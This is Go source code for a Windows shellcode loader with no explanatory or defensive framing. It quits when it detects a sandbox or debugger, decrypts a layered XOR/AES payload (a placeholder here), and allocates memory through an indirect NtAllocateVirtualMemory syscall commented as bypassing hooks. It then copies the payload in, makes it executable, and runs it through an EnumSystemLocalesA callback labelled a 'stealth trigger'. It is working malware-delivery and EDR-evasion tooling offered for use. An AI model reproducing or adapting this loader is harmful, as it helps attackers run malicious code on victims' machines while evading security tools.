package main

import (
	"crypto/aes"
	"crypto/cipher"
	"os"
	"runtime"
	"syscall"
	"time"
	"unsafe"
)

// Link the assembly function
func indirectSyscall(ssn uint16, syscallAddr uintptr, handle uintptr, addr *uintptr, zeroBits uintptr, size *uintptr, allocType uintptr, protect uintptr) uintptr

var (
	k32 = syscall.NewLazyDLL("kernel32.dll")
	nt  = syscall.NewLazyDLL("ntdll.dll")

	vProtect      = k32.NewProc("VirtualProtect")
	rtlMoveMemory = nt.NewProc("RtlMoveMemory")
	enumLocales   = k32.NewProc("EnumSystemLocalesA")
)

func checkEnvironment() {
	if runtime.NumCPU() < 2 { os.Exit(0) }
	start := time.Now()
	time.Sleep(50 * time.Millisecond)
	if time.Since(start) < 50*time.Millisecond { os.Exit(0) }
	isDebugger := k32.NewProc("IsDebuggerPresent")
	res, _, _ := isDebugger.Call()
	if res != 0 { os.Exit(0) }
}

func unpack(data []byte, aesKey []byte, xorKey byte) []byte {
	for i := range data { data[i] ^= xorKey }
	block, _ := aes.NewCipher(aesKey)
	gcm, _ := cipher.NewGCM(block)
	nonceSize := gcm.NonceSize()
	decrypted, _ := gcm.Open(nil, data[:nonceSize], data[nonceSize:], nil)
	return decrypted
}

func main() {
	checkEnvironment()

	packedPayload := []byte{0xde, 0xad, 0xbe, 0xef} // Placeholder
	aesKey := []byte("32-byte-key-for-aes-256-standard")
	xorKey := byte(0xFF)

	decrypted := unpack(packedPayload, aesKey, xorKey)

	// Layer 3: Indirect Syscall for Allocation (NtAllocateVirtualMemory)
	// Finding the SSN (0x18 for Win10/11) and the 'syscall' instruction address
	ntAlloc := nt.NewProc("NtAllocateVirtualMemory")
	ssn := uint16(0x18)
	syscallInst := ntAlloc.Addr() + 0x12 

	var baseAddress uintptr
	size := uintptr(len(decrypted))
	
	// Perform the allocation indirectly to bypass hooks on NtAllocateVirtualMemory
	indirectSyscall(ssn, syscallInst, uintptr(0xffffffffffffffff), &baseAddress, 0, &size, 0x3000, 0x04)

	// Layer 4: Manual Memory Bridge
	rtlMoveMemory.Call(baseAddress, uintptr(unsafe.Pointer(&decrypted[0])), uintptr(len(decrypted)))

	var oldProtect uint32
	vProtect.Call(baseAddress, uintptr(len(decrypted)), 0x20, uintptr(unsafe.Pointer(&oldProtect)))

	// Layer 5: Stealth Trigger
	enumLocales.Call(baseAddress, 0)
}
